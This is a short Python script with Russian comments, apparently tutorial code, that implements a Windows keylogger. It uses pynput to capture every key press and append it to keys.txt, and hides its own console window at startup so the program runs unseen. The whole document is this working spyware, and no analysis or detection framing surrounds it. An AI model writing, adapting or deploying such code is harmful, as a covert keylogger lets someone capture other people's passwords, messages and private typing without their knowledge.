from pynput.keyboard import Listener, Key
# импортируем нужные классы, Listener - прослушиватель нажатий, Key - удобно получает коды клавиш в ascii

import win32api
import win32gui
import win32console

window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

# пишем функцию, которая будет срабатывать при отпускании клавиши. Для теста мы поставим так, что при нажатии
# клавиши escape программа перестанет работать
def key_released(key):
    if key == Key.esc:
        return False

# пишем функцию, которая будет срабатывать после того, как клавиша нажата
def key_pressed(key):
    k = str(key).replace("'", '')

    if key == Key.space:
        k = '\n'
    if k.find('Key.') == -1:
        with open('keys.txt', 'at') as f:
            f.write(k)
            #f.write(k + ' | dict_rus[k]')

'''with Listener(
        on_press=lambda key: print(key),
        # напишем простенькую лямбду, в дальнейшем поменяем на полноценную функцию, сейчас нам надо лишь просмотреть,
        # как работает прослушиватель, поэтому просто печатаем клавишу в консоль
        on_release=lambda key: False,
) as listener:
    listener.join() # подключаем прослушку
'''

with Listener(
        on_press=key_pressed,
        on_release=key_released
) as listener:
    listener.join() # подключаем прослушку

